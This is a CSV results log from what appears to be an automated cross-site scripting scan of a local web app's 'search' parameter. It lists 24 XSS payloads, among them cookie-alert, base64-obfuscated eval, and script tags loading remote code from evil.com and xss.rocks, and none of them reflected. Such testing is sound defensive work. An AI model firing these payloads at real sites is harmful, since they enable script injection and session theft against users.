Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert('XSS')</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<script>alert(""XSS"")</script>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>prompt(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>confirm(1)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.cookie)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(document.domain)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script>alert(window.origin)</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script src=//xss.rocks/xss.js></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<script src=https://evil.com/xss.js></script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg/onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert(1)</script></svg>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,"<svg/onload=alert(String.fromCharCode(88,83,83))>",NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=confirm(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=alert`1`>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg onload=eval(atob('YWxlcnQoMSk='))>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<svg><script>alert&#40;1&#41;</script>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=confirm(1)>,NO_REFLECTION,No,,Info
2026-01-09 17:14:25,http://localhost:3000/,GET,search,<img src=x onerror=alert('XSS')>,NO_REFLECTION,No,,Info
